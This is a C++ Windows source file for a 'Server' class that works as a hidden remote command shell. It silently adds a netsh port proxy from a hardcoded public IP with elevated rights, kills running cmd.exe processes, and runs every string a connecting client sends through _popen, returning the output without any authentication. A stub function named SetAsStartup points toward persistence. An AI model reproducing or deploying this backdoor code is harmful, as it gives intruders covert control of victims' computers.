#include <iostream>
#include "Server.h"

#include <string>
#include <sstream>
#include <vector>

#include <WS2tcpip.h>
#include <winsock.h>
#include <Windows.h>

Server::Server()
{

}

bool Server::Bind(std::string Port)
{
	std::stringstream ss;
	ss<<"interface portproxy add v4tov4 listenport="<<Port<<" listenaddress=95.149.45.247 connectport="<<Port<<" connectaddress=127.0.0.1";
	ShellExecute(NULL, "runas", "netsh.exe", ss.str().c_str(), NULL, SW_HIDE);
	Sleep(1000);
	system("taskkill /f /im cmd.exe");
	WSAData Data;

	if(WSAStartup(MAKEWORD(1, 1), &Data)!=0)
	{
		return false;
	}

	addrinfo Hints, *ServerInfo;

	memset(&Hints, 0, sizeof(Hints));
	Hints.ai_family=AF_INET;
	Hints.ai_socktype=SOCK_STREAM;
	Hints.ai_protocol=IPPROTO_TCP;
	Hints.ai_flags=AI_PASSIVE;

	int Rcv;
	if((Rcv=getaddrinfo(NULL, Port.c_str(), &Hints, &ServerInfo))!=0)
	{
		Shutdown();
		return false;
	}

	char yes=1;
	addrinfo *p;
	for(p=ServerInfo; p!=NULL; p=p->ai_next)
	{
		if((ServerSocket=socket(p->ai_family, p->ai_socktype, p->ai_protocol))==-1)
		{
			continue;
		}

		if(setsockopt(ServerSocket, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int))==-1)
		{
			Shutdown();
			return false;
		}

		if(bind(ServerSocket, p->ai_addr, p->ai_addrlen)==-1)
		{
			closesocket(ServerSocket);
			continue;
		}

		break;
	}

	if(p==NULL)
	{
		return false;
	}

	freeaddrinfo(ServerInfo);

	return true;
}
void Server::Start()
{
	if(listen(ServerSocket, 5) == -1)
	{
		return;
	}

	// Wait for a connection
	while(true)
	{
		system("cls");
		std::cout<<"Awaiting connection...";
		sockaddr_storage Storage;
		socklen_t Size=sizeof(Storage);

		ClientSocket=accept(ServerSocket, (sockaddr *)&Storage, &Size);
		if(ClientSocket==-1)
		{
			continue;
		}

		char s[INET6_ADDRSTRLEN];
		inet_ntop(Storage.ss_family, GetInAddr((sockaddr *)&Storage), s, sizeof(s));
		std::cout<<"Connection received from: "<<s<<std::endl;
		// Got connection

		while(true)
		{
			std::string Received=Receive();
			if(Received=="/clientdisconnected")
			{
				closesocket(ClientSocket);
				break;
			}
			else if(Received=="/disconnect")
			{
				Send("/exit");
				closesocket(ClientSocket);
				break;
			}
			else if (Received=="/shutdown")
			{
				Send("/exit");
				Shutdown();
				return;
			}
			else
			{
				Send(RunCommand(Received));
			}
		}
	}

	Shutdown();
}

bool Server::Send(std::string Message)
{
	std::vector<char> Msg=std::vector<char>(Message.begin(), Message.end());
	int SentTotal=0, Sent=0;

	// Add message size
	std::string Size;
	std::stringstream ss=std::stringstream();
	ss<<Msg.size();
	Size=ss.str();
	// Add size indicator length
	Msg.insert(Msg.begin(), Size.size());
	Msg.insert(Msg.begin()+1, Size.begin(), Size.end());

	while(Msg.size()>0)
	{
		if((Sent = send(ClientSocket, &Msg[0], Msg.size(), 0))==-1)
		{
			return false;
		}
		Msg.erase(Msg.begin(), Msg.begin()+Sent);
	}

	return true;
}
std::string Server::Receive()
{
	int Bytes=0;
	std::vector<char> Buffer;
	std::string Result;

	Buffer.resize(1);

	// Get size of of length of size
	Bytes=recv(ClientSocket, &Buffer[0], 1, 0);
	if(Bytes<=0)
	{
		return "/clientdisconnected";
	}
	int BytesToGet=Buffer[0];

	Buffer.clear();
	Buffer.resize(BytesToGet);
	// Get length
	Bytes=recv(ClientSocket, &Buffer[0], BytesToGet, 0);
	if(Bytes<=0)
	{
		return "/clientdisconnected";
	}

	std::stringstream ss=std::stringstream();
	for(int x=0; x<BytesToGet; x++)
	{
		ss<<Buffer[x];
	}

	int PackageBytes=atoi(ss.str().c_str());
	Buffer.clear();
	Buffer.resize(PackageBytes);
	do
	{
		if((Bytes=recv(ClientSocket, &Buffer[0], PackageBytes, 0))<=0)
		{
			return "/clientdisconnected";
		}
		Result.append(Buffer.begin(), Buffer.end());
	} while(Bytes!=PackageBytes);

	return Result;
}

bool SetAsStartup()
{
	return true;
}

void Server::Shutdown()
{
	closesocket(ClientSocket);

	WSACleanup();
}

std::string Server::RunCommand(std::string Input)
{
	FILE *Pipe=_popen(Input.c_str(), "r");
	if(!Pipe)
	{
		return "Error";
	}
	char Buffer[256];
	std::string Result="";
	while(!feof(Pipe))
	{
		if(fgets(Buffer, 256, Pipe)!=NULL)
		{
			Result+=Buffer;
		}
	}
	_pclose(Pipe);
	return Result;
}

void *Server::GetInAddr(sockaddr *sa)
{
	if(sa->sa_family==AF_INET)
	{
		return &(((sockaddr_in *)sa)->sin_addr);
	}
	else
	{
		return &(((sockaddr_in6 *)sa)->sin6_addr);
	}
}
